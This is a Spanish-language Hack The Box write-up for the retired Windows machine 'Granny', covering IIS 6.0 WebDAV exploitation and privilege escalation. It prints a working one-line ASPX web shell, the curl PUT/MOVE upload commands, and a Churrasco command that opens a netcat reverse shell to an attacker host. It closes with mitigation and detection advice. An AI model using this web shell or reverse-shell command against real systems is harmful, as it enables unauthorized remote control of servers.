---
machine: Granny
os: Windows
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [windows, iis, webdav, aspx, seimpersonate, churrasco]
---

# Granny — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

IIS 6.0 con WebDAV permite subir un `.aspx` y moverlo a una extensión ejecutable. El webshell corre como `NETWORK SERVICE`, que tiene `SeImpersonatePrivilege`; Churrasco lo eleva a `SYSTEM`.

## Enumeración

```bash
nmap -p- --min-rate 5000 -T4 <IP>
nmap -sC -sV -p80 <IP>
```

```text
80/tcp open  http  Microsoft IIS httpd 6.0
| http-methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, COPY, MOVE, PROPFIND...
```

IIS 6.0 y WebDAV habilitado apuntan a Windows Server 2003. Se comprueba con `davtest` o `cadaver`:

```bash
davtest -url http://<IP>
```

## Acceso inicial

WebDAV permite `PUT`, pero la ejecución de `.aspx` está filtrada. Se sube el webshell con una extensión permitida y se renombra con `MOVE`:

```bash
curl -T shell.aspx.txt http://<IP>/shell.aspx.txt
curl -X MOVE -H 'Destination: http://<IP>/shell.aspx' http://<IP>/shell.aspx.txt
```

El contenido es un webshell ASPX mínimo que ejecuta comandos:

```aspx
<%@ Page Language="C#" %><% Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c "+Request["c"]).StandardOutput.ReadToEnd()); %>
```

```bash
curl 'http://<IP>/shell.aspx?c=whoami'
# nt authority\network service
```

## Escalada a SYSTEM

```bash
whoami /priv
# SeImpersonatePrivilege  Enabled
```

Se sube `churrasco.exe` y `nc.exe` (por TFTP, SMB o `certutil` si está disponible).

```bash
curl 'http://<IP>/shell.aspx?c=C:\temp\churrasco.exe -d "C:\temp\nc.exe -e cmd.exe <LHOST> <LPORT>"'
```

El listener recibe una shell `NT AUTHORITY\SYSTEM`. Se lee la flag y se redacta.

## Evidencia

- `nmap` con IIS 6.0 y verbos WebDAV.
- `PUT`/`MOVE` y salida de `whoami`.
- `whoami /priv` con `SeImpersonatePrivilege`.
- Shell SYSTEM en el listener.

## Lecciones aprendidas

- WebDAV con `PUT` y `MOVE` permite saltarse filtros de extensión.
- `NETWORK SERVICE` en Server 2003 suele tener `SeImpersonatePrivilege`.
- Churrasco (MS09-012) es la vía clásica a SYSTEM en ese sistema.
- Los sistemas sin soporte acumulan vectores de escalada.

## Mitigación y detección

- Deshabilitar WebDAV o restringir `PUT`/`MOVE`.
- Actualizar IIS y Windows Server.
- Retirar `SeImpersonatePrivilege` de cuentas de servicio que no lo necesiten.
- Detectar `PUT` a extensiones dobles y procesos `churrasco`/`nc` desde `w3wp.exe`.

## Referencias

- <https://www.hackthebox.com/machines/granny>
- <https://learn.microsoft.com/en-us/iis/configuration/system.webserver/webdav/>
- <https://attack.mitre.org/techniques/T1505/003/>
